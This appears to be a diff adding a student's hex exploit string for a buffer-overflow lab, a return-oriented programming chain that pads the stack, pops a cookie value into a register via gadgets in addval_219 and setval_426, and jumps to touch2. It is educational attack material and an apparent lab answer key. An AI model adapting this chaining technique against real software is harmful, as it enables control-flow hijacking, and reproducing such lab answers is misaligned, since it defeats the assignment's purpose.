@@ -1,0 +1,6 @@
+48 89 e7 68 fa 18 40 00 c3 61 61 61 61 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87  
+/* 40 bytes of padding */
+ab 19 40 00 00 00 00 00   /* addr to gadgets: popq %rax; nop; ret; in addval_219 func */
+fa 97 b9 59 00 00 00 00   /* cookie */
+c5 19 40 00 00 00 00 00   /* addr to gadgets: movq %rax, %rdi; ret; in setval_426 func  */  
+ec 17 40 00 00 00 00 00   /* addr to touch2 func */ 
